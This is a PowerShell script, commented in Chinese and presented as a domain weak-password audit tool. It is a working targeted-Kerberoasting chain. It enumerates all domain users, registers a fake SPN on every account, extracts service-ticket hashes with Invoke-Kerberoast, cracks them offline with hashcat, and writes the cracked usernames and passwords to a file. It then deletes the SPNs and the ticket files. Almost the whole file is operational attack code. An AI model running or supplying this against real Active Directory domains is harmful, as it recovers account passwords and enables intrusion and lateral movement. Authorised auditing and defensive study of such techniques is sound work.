<#
domainAccountCheck.ps1
Author: JC (@chroblert)
#>
# 得到域中所有的用户
function Get-UserList
{
	# 将包含域用户账户的结果保存到$resultList中去
	$resultList = net group "domain users" /domain |%{ $_ -split " "}|%{ if ($_ -ne ""){$_.trim()}}
	# 上述列表中，包含一些杂乱的数据，需要将其进行清洗
	foreach ($line in $resultList){
		if($line.contains("---")){
			$start = $resultList.indexof($line) + 1
			# 减去2是因为最后一个的下标比数量少1，且最后一个不是有效的账户
			$end = $resultList.count - 2 
		}
	}
	$userListA = $resultList[$start..$end]
	$userList = New-Object System.Collections.ArrayList
	foreach ($user in $userListA){
		if( -Not $user.contains("$")){
			$userList.add($user)|Out-Null
		}
	}
	Write-Host "保存域中所有的域用户账号到.\result\allUserList.txt文件中去"
	$userList | Out-File ".\result\allUserList.txt"
	return $userList.clone()
}
# 为域用户账户注册SPN
function Set-SPN{
	Param(
		[System.Collections.ArrayList] $allUserList
	)
	if($allUserList -eq $null){
		if(Test-Path ".\result\allUserList.txt"){
			Write-Host "使用result目录下的allUserList.txt文件进行操作"
			$allUserList = Get-Content .\result\allUserList.txt 
		}else{
			Write-Host "参数值错误，且不存在allUserList.txt文件,EXIT"
			return $false
		}
		
	}
	$sucUserList = New-Object System.Collections.ArrayList
	$faiUserList = New-Object System.Collections.ArrayList
	$sucSPNList = New-Object System.Collections.ArrayList
	$faiSPNList = New-Object System.Collections.ArrayList
	$allUserAndSPNList = New-Object System.Collections.ArrayList
	foreach ($num in 1..$allUserList.count){
		# 将要执行的命令进行动态拼接
		$SPNStr = "weakPasswordTest/JC-ISDevil" + $num
		$userStr = $allUserList[$num-1]
		$allUserAndSPNList.add($userStr + "|#|" + $SPNStr) | Out-Null
		# 执行包含命令的字符串
		# 使用Invoke-Expression后不知如何判断字符串命令执行的结果，因而弃用
		#Invoke-Expression $setStr
		# redirect error stream(2) to success stream(1)
		setspn -S $SPNStr -U $userStr 2>&1 | Out-Null
		if ($? -contains "True"){
			Write-Host -ForegroundColor Green "【+】" $userStr "注册成功"
			$sucUserList.add($userStr) | Out-Null
			$sucSPNList.add($SPNStr) | Out-Null
		}else{
			Write-Host -ForegroundColor Red "【-】" $userStr "注册失败"
			$faiUserList.add($userStr)|Out-Null
		}
		# 暂停 等待用户输入数据
		# Read-Host
	}
	Write-Host "保存所有user和SPN到.\result\allUserAndSPNList.txt文件中去"
	$allUserAndSPNList | Out-File ".\result\allUserAndSPNList.txt"
	Write-Host "保存注册SPN成功的域用户账号到.\result\sucUserList.txt文件中去"
	$sucUserList | Out-File ".\result\sucUserList.txt"
	Write-Host "保存注册SPN成功的SPN到.\result\sucSPNList.txt文件中去"
	$sucSPNList | Out-File ".\result\sucSPNList.txt"
	Write-Host "保存注册SPN失败的域用户账号到.\result\faiUserList.txt文件中去"
	$faiUserList | Out-File ".\result\faiUserList.txt"
	return $sucUserList,$sucSPNList,$faiUserList
}

function Del-SPN{
	Param(
		[System.Collections.ArrayList] $sucSPNListA,
		[System.Collections.ArrayList] $sucUserListA
	)
	if ($sucSPNListA -eq $null -or $sucUserListA -eq $null){
		if(Test-Path '.\result\sucSPNList.txt' -and Test-Path ".\result\sucUserList.txt"){
			Write-Host "传参错误，将启用文件sucSPNList.txt和sucUserList.txt中的内容"
			$sucSPNListA = Get-Content .\result\sucSPNList.txt  
			$sucUserListA = Get-Content .\result\sucUserList.txt 
		}else{
			Write-Host "传参错误且相关文件不存在，EXIT"
			return $false
		}
	}
	if ($sucSPNListA.count -ne $sucUserListA.count){
		Write-Host "SPN数量与用户数量不等，EXIT"
		return $false
	}
	if ($sucSPNListA.count -eq 0 -OR $sucUserListA.count -eq 0){
		Write-Host "数组为空，EXIT"
		return $false
	}
	foreach ($spnStr in $sucSPNListA){
		setspn -D $spnStr $sucUserListA[$sucSPNListA.indexof($spnStr)] 2>&1 |Out-Null
		if($? -contains "True") {
			Write-Host "删除成功"
		}else{
			Write-Host "删除失败"
		}
	}
	Write-Host "全部删除成功"
}

# 访问SPN得到TGS发放的服务票据ST,提取其中的Hash值并保存到krbstHash.txt文件中去
function Get-ServiceTicket{
	Param(
		[String] $krbstHashFileName
	)
	Import-Module ./kerberoast/Invoke-Kerberoast.ps1
	# Set-Content 以ANSI编码方式保存文件；Out-File 默认以Unicode方式保存文件，因而需要指定编码格式
	Invoke-Kerberoast -OutputFormat Hashcat|select hash|%{$_.Hash}|Out-File $krbstHashFileName -Encoding ascii
}
# 引入tgscrack来爆破下载下来的凭据
function Crack-ServiceTicket{
	Param(
		[String] $krbstHashFileName,
		[String] $passwdDictFileName
	)
	Write-Host "正在爆破中ing.......请稍等"
	# $tgsCrackResult = python27 .\kerberoast\tgsrepcrack.py .\Dicts\GaiaPasswd.txt .\*.kirbi
	if((Test-Path $krbstHashFileName) -and (Test-Path $passwdDictFileName)){
		.\hashcat\hashcat64.exe -m 13100 -a 0 $krbstHashFileName $passwdDictFileName -o ".\succeed.txt" --force
		if(Test-Path ".\result\succeed.txt"){
			$hashAndPasswdList = Get-Content ".\result\succeed.txt"
			$userAndPasswdList = New-Object System.Collections.ArrayList
			foreach($item in $hashAndPasswdList){
				$userStr = ($item.split("$")[3]).split("*")[1]
				$passwdStr = $item.split(":")[1]
				$userAndPasswd = $userStr + "|#|" + $passwdStr
				Write-Host -ForegroundColor Green "【+】" $userAndPasswd
				$userAndPasswdList.add($userAndPasswd) | Out-Null
			}
		}else{
			Write-Host "没有从密码字典中审计出弱口令"
			return $false
		}
	}else{
		Write-Host "相关文件不存在，EXIT"
		return $false
	}
	Write-Host "将破解出的用户名和密码保存到.\result\userAndPasswdList.txt文件中去"
	$userAndPasswdList | Out-File ".\result\userAndPasswdList.txt"
}
# 删除保存下来的kirbi文件
function Del-ServiceTicket{
	$isDelet = Read-Host "是否删除下载的kirbi文件`n Y/n"
	if ($isDelet -eq "Y" -OR $isDelet -eq "yes"){
		$dirList = Get-ChildItem|select name|%{$_.name}
		foreach ($line in $dirList){
			if ($line.split(".")[-1] -eq "kirbi"){
				# 删除文件
				Remove-Item $line
				Write-Host "删+"
			}
		}
	}
}
# 创建一个用来保存结果的目录
if(-Not (Test-Path ".\result")){
	New-Item -ItemType Directory "result"
}
# menu
Write-Host "======domainAcountCheck======"
Write-Host "||      Author:JC          ||"
Write-Host "||      Version:2.0.1      ||"
Write-Host "============================="
Write-Host "===         选项          ==="
Write-Host "| 1 获取域内所有域用户账户"
Write-Host "| 2 为域内的所有用户账户尝试注册SPN"
Write-Host "| 3 获取现有SPN的凭据的Hash"
Write-Host "| 4 爆破获得的Hash"
Write-Host "| 5 删除注册的SPN"
Write-Host "| 6 全部运行"
Write-Host "| 0 EXIT"
$krbstHashFile = ".\krbstHash.txt"
$passwdDictFile = ".\Dicts\JCPasswd.txt"
Do {
	$choice = Read-Host "请选择一个选项进行操作`n>>"
	switch($choice){
		1 {
			Write-Host "获取到所有的域用户账户"
			$allUserList = Get-UserList
			break
		}
		2 {
			Read-Host "为每一个域用户账号注册SPN"
			$sucUserList,$sucSPNList,$faiUserList = Set-SPN $allUserList
			break
		}
		3 {
			Get-ServiceTicket $krbstHashFile
			break	
		}
		4 {
			Crack-ServiceTicket $krbstHashFile $passwdDictFile
			break
		}
		5 {
			Read-Host "下面将要为注册SPN成功的域用户账户删除SPN"
			Del-SPN $sucSPNList $sucUserList
			break
		}
		6 {
			# 1. 获取用户
			Write-Host "获取到所有的域用户账户"
			$allUserList = Get-UserList
			# 2. 注册SPN
			Read-Host "为每一个域用户账号注册SPN"
			$sucUserList,$sucSPNList,$faiUserList = Set-SPN $allUserList
			# 3. 访问SPN获得ST,并以hashcat模式保存到文件krbstHash.txt中
			Get-ServiceTicket $krbstHashFile
			# 4. 使用hashcat爆破ST中hash对应的口令
			Crack-ServiceTicket $krbstHashFile $passwdDictFile
			# 5. 删除SPN
			Read-Host "下面将要为注册SPN成功的域用户账户删除SPN"
			Del-SPN $sucSPNList $sucUserList
			break
		}
		0 {	return $false ;break}
		default {"请重新选择"}
	}
}While($true)
